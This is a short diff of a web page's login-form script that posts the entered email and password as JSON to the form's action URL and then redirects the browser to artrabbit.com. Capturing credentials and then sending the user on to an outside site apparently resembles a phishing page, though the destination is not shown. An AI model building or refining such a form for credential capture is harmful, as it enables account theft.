@@ -768,31 +768,33 @@
     
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
+        e.stopPropagation();
         
-        // Create an object with the form data
         const formData = {
             email: form.querySelector('#email').value,
             password: form.querySelector('#password').value
         };
         
         try {
-            const response = await fetch(form.action, {
+            const response = await fetch(form.action, {  // Using the form's action attribute
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'  // Important!
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(formData)  // Convert to JSON string
+                body: JSON.stringify(formData)
             });
             
             const data = await response.json();
-            console.log('Response:', data);  // Debug log
             
             if (data.status === "success") {
-                window.location.href = 'https://artrabbit.com';
+                window.location.replace('https://artrabbit.com');
+                return false;
             }
         } catch (error) {
             console.error('Error:', error);
         }
+        
+        return false;
     });
 });
 </script>
